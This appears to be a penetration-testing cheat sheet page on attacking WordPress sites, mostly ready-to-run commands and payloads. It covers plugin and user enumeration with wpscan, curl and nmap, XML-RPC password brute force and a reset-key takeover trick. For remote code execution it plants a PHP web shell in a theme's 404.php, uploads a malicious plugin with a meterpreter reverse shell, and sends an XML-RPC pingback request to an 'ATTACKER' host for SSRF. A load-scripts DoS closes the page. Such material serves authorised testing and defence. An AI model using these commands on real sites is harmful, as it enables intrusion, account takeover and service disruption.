---
tags:
  - Web
---

# :material-wordpress: WordPress

<span class="pill pill-medium">very common</span> <span class="pill pill-info">web</span>

WordPress core is usually solid — **the plugins and themes are the hole**. ~60% of
the web runs it, and most compromises come from one outdated plugin.

!!! abstract "TL;DR"
    `wpscan` to enumerate version + plugins + users → find the weakest plugin's CVE
    → or brute a user via XML-RPC → admin → PHP theme editor = RCE.

## :material-magnify: Enumerate

```bash
wpscan --url https://$TARGET --enumerate ap,at,u --api-token $WPSCAN_TOKEN
#   ap = all plugins   at = all themes   u = users
wpprobe scan -u https://$TARGET/ --mode hybrid       # fast plugin/version probe

# manual fingerprints
curl -s https://$TARGET/ | grep -oE 'wp-content/plugins/[^/]+'   # installed plugins
curl -s https://$TARGET/wp-json/wp/v2/users                      # user enum via REST
curl -s https://$TARGET/?rest_route=/wp/v2/users
curl -s https://$TARGET/readme.html | grep -i version            # core version
```

!!! loot "User enumeration is trivial"
    `/wp-json/wp/v2/users`, `?author=1` redirects, and login error differences all
    leak valid usernames → feed [Password Spraying](../network/password-spraying.md).

## :material-key: Brute force & auth

```bash
# XML-RPC amplifies brute force (many creds per request) — much faster than wp-login
wpscan --url https://$TARGET -U users.txt -P rockyou.txt
# system.multicall to test hundreds of passwords in one POST to /xmlrpc.php
```

!!! bug "SQLi in a plugin but the hashes won't crack?"
    Don't crack — **reset**. Request a password reset, then use the leaked
    activation key: `/wp-login.php?action=rp&key=<KEY>&login=<USER>`.

## :material-fire: Admin → RCE

Once you're admin, code execution is built in:

```text
# 1) Appearance → Theme Editor → edit 404.php → <?php system($_GET['c']); ?>
#    then hit /wp-content/themes/<theme>/404.php?c=id
# 2) Upload a malicious plugin (zip with PHP) → Plugins → Add New → Upload
# 3) msfvenom PHP payload dropped via the media/upload flow
```

```bash
# XML-RPC pingback → SSRF / port-scan the internal network
curl -s https://$TARGET/xmlrpc.php -d \
'<methodCall><methodName>pingback.ping</methodName><params>
<param><value>http://ATTACKER/</value></param>
<param><value>https://'"$TARGET"'/?p=1</value></param></params></methodCall>'
```

## :material-api: REST / wp-json endpoint hitlist

Beyond user enum, walk the REST API for leaky settings, private content, and plugin
routes:

```text
/wp-json/                          # route index — reveals installed plugin namespaces
/wp-json/wp/v2/settings            # may leak config if auth is broken
/wp-json/wp/v2/media
/wp-json/wp/v2/posts?status=any    # drafts/private posts if authz is weak
/wp-json/wp/v2/pages?status=private
/wp-json/wordfence/v1/config       # security-plugin config
/wp-json/elementor/v1/system-info  # page-builder environment info
```

## :material-account-multiple: User enumeration — more vectors

Beyond `/wp-json/wp/v2/users` and `?author=1`:

```bash
# author-id sweep (301 Location / "View all posts by" leak the login)
for i in $(seq 1 100); do
  curl -s -L -i "https://$TARGET/?author=$i" | grep -Eo 'author/[a-z0-9._-]+' | head -1
done | sort -u
```

```text
# REST route form (bypasses some ?author blocks)
https://$TARGET/?rest_route=/wp/v2/users
# RDF feed exposes dc:creator
https://$TARGET/feed/rdf/     /search/feed/rss2/     /search/<char>/feed/rss2/
# Default search may surface author meta tags
?s=author     ?s=by        (search param may be renamed)
```

```http
# wp-graphql plugin — POST /graphql leaks all users
POST /graphql HTTP/1.1
Host: $TARGET

{"query":"{ users { nodes { id name } } }"}
```

Note: WordPress login/reset messages differ by whether the user exists — another
oracle. See [WPGraphQL docs](https://www.wpgraphql.com/docs/users/).

## :material-folder-open: Directory indexing & path leaks

```text
# If these list contents ("Index of"), plugin/theme/version enum is trivial:
/wp-content/   /wp-content/plugins/   /wp-content/themes/   /uploads/
# Internal absolute paths leaked via direct includes:
/wp-includes/class-wp-xmlrpc-server.php   /wp-includes/functions.php
/wp-includes/ms-settings.php   /wp-includes/rss.php   /wp-includes/template-loader.php
```

## :material-tools: nmap NSE & plugin RCE

```bash
# Enumerate users + brute logins via NSE
nmap -sV --script http-wordpress-enum --script-args limit=100 $TARGET
nmap -p80 --script http-wordpress-brute $TARGET
# List supported XML-RPC methods
nmap --script xmlrpc-methods.nse --script-args "xmlrpc-methods.url=https://$TARGET/xmlrpc.php" $TARGET
```

- **Admin → RCE via malicious plugin:** build a payload plugin with
  [malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin),
  upload as a new plugin, activate, then hit its PHP path with a metasploit
  `php/meterpreter/reverse_tcp` listener.

## :material-alert-octagon: Load-script DoS

`/wp-admin/load-scripts.php` (and `load-styles.php`) will concatenate an
attacker-supplied list of ~181 core scripts in one request — large response, high
server cost, amplifiable into DoS. Reference:
[Barak Tawily's write-up](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html).

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Admin theme-editor RCE → [Linux Privesc](../privesc/linux.md); pingback → [SSRF](../web/ssrf.md).
- Reference: [WPScan](https://github.com/wpscanteam/wpscan), [HackTricks WordPress](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html).
